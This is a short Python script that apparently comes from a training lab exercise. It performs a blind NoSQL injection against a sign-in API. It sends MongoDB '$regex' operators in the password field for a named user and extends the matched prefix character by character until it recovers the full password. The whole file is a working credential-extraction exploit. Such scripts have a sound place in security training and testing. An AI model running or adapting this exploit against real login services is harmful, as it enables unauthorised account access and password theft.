import re
import requests

url = "http://web0x01.hbtn/api/a3/nosql_injection/sign_in"
chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*_-"

def extend(prefix):
    for c in chars:
        test = prefix + c
        payload = {"username": "elon-musk", "password": {"$regex": "^" + re.escape(test)}}
        resp = requests.post(url, json=payload).json()
        if resp.get("status") == "success":
            print("MATCH:", test)
            extend(test)

extend("")
